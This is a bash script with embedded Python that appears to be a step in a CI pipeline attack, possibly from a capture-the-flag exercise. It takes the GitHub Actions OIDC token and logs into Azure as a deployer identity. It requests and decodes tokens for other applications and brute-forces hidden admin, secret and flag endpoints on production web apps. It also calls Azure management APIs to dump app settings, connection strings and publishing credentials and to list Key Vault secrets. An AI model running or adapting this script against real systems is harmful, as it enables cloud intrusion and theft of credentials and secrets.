#!/usr/bin/env bash
set -uo pipefail

TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
PLATFORM_RG="rg-tbl-platform-prod-sea"

echo "=== BUILD54: ARMOWNER ROLE + STOREFRONT ENUM ==="

# 1. Login as cicd-deployer
JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$JWT" --allow-no-subscriptions -o none
echo "cicd-deployer OK"

python3 -I << 'PYEOF'
import subprocess, json, urllib.request, urllib.error, re

# Get ARM token
r = subprocess.run(['az','account','get-access-token','--resource','https://management.azure.com','--query','accessToken','-o','tsv'],
  capture_output=True, text=True)
ARM = r.stdout.strip()
print(f"cicd ARM len={len(ARM)}")

# Get token with audience = tbl-platform-automation (sync-service)
# appId = 462d1c38-4459-48b8-9333-82e389e59514
SYNC_APPID = "462d1c38-4459-48b8-9333-82e389e59514"
r2 = subprocess.run(['az','account','get-access-token','--resource',SYNC_APPID,'--query','accessToken','-o','tsv'],
  capture_output=True, text=True)
SYNC_TOK = r2.stdout.strip()
print(f"cicd SYNC_TOK len={len(SYNC_TOK)}")

if len(SYNC_TOK) > 100:
    # Decode it to see what roles we have
    parts = SYNC_TOK.split('.')
    import base64
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '==').decode())
    print(f"sync_token_roles: {payload.get('roles', [])}")
    print(f"sync_token_aud: {payload.get('aud','')}")
    print(f"sync_token_appid: {payload.get('appid','')}")

SUB = "c5e4e004-b42d-4ac4-a502-5fd338380eb6"
PLATFORM_RG = "rg-tbl-platform-prod-sea"
FDID = "60407ff3-1c24-4875-9390-b6c9c13b0821"

def rq(url, tok, method="GET", data=None, extra_hdrs=None):
    h = {"Authorization":"Bearer "+tok}
    if extra_hdrs:
        h.update(extra_hdrs)
    if isinstance(data,(dict,list)):
        data = json.dumps(data).encode()
        h["Content-Type"] = "application/json"
    elif isinstance(data, str):
        data = data.encode()
    try:
        r = urllib.request.urlopen(urllib.request.Request(url,data=data,method=method,headers=h),timeout=30)
        return r.status, r.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8","replace")[:3000]
    except Exception as e:
        return 0, str(e)[:300]

if len(SYNC_TOK) > 100:
    # Try SYNC token on storefront endpoints
    STOREFRONT = "https://app-tbl-storefront-prod.azurewebsites.net"
    FDID_HDR = {"X-Azure-FDID": FDID}

    # Try all known and unknown endpoints with the ArmOwner token
    for endpoint in [
        "/",
        "/internal",
        "/internal/debug",
        "/internal/admin",
        "/internal/flag",
        "/internal/config",
        "/api/v1/admin",
        "/api/v1/admin/flag",
        "/api/v1/admin/config",
        "/api/v1/admin/secrets",
        "/api/v1/platform",
        "/api/v1/platform/flag",
        "/api/v1/flag",
        "/api/v1/config",
        "/api/v1/secrets",
        "/flag",
        "/flag.txt",
        "/admin",
        "/admin/flag",
        "/sync",
        "/sync/flag",
        "/platform",
        "/automation",
        "/api/v1/reports/admin",
    ]:
        s, b = rq(f"{STOREFRONT}{endpoint}", SYNC_TOK, extra_hdrs=FDID_HDR)
        if s not in [404, 405] and 'Method Not Allowed' not in b and '404' not in b:
            print(f"storefront{endpoint}: {s} {b[:500]}")
        else:
            print(f"storefront{endpoint}: {s}")

    # Also try reporting app
    REPORTING = "https://app-tbl-reporting-prod.azurewebsites.net"
    for endpoint in [
        "/",
        "/internal",
        "/internal/debug",
        "/internal/admin",
        "/internal/flag",
        "/api/v1/admin",
        "/api/v1/admin/flag",
        "/api/v1/flag",
        "/api/v1/platform",
        "/flag",
        "/flag.txt",
        "/admin",
        "/sync",
        "/p51",
    ]:
        s, b = rq(f"{REPORTING}{endpoint}", SYNC_TOK)
        if s not in [404, 405]:
            print(f"reporting{endpoint}: {s} {b[:300]}")
        else:
            print(f"reporting{endpoint}: {s}")

if len(ARM) > 100:
    # Get storefront app settings via ARM (storefront IS in platform RG - correct!)
    # Try config/list via ARM
    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2022-03-01", ARM, "POST")
    print(f"storefront_appsettings_list: {s}:{b[:3000]}")

    # Also try config/connectionstrings/list
    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/connectionstrings/list?api-version=2022-03-01", ARM, "POST")
    print(f"storefront_connstrings_list: {s}:{b[:3000]}")

    # Get web config
    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/web?api-version=2022-03-01", ARM)
    print(f"storefront_webconfig: {s}:{b[:3000]}")

    # List KV prod secrets WITHOUT maxresults (find all secrets)
    r3 = subprocess.run(['az','account','get-access-token','--resource','https://vault.azure.net','--query','accessToken','-o','tsv'],
      capture_output=True, text=True)
    VAULT = r3.stdout.strip()

    if len(VAULT) > 100:
        s,b = rq("https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4", VAULT)
        print(f"kv_prod_secrets_list: {s}:{b[:5000]}")

        # Try to list KV sec secrets with cicd-deployer's vault token
        s,b = rq("https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4", VAULT)
        print(f"kv_sec_secrets_list: {s}:{b[:2000]}")

    # Check if storefront Kudu is accessible with cicd-deployer
    # Get Kudu credentials via the config/list action on the storefront (platform RG)
    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/publishingcredentials/list?api-version=2022-03-01", ARM, "POST")
    print(f"storefront_kudu_creds: {s}:{b[:3000]}")

    # Try config action
    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/list?api-version=2022-03-01", ARM, "POST")
    print(f"storefront_config_list: {s}:{b[:3000]}")

    # List storefront functions/extensions
    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.Web/sites/app-tbl-storefront-prod?api-version=2022-03-01", ARM)
    print(f"storefront_full: {s}:{b[:3000]}")

PYEOF

echo "BUILD54 DONE"
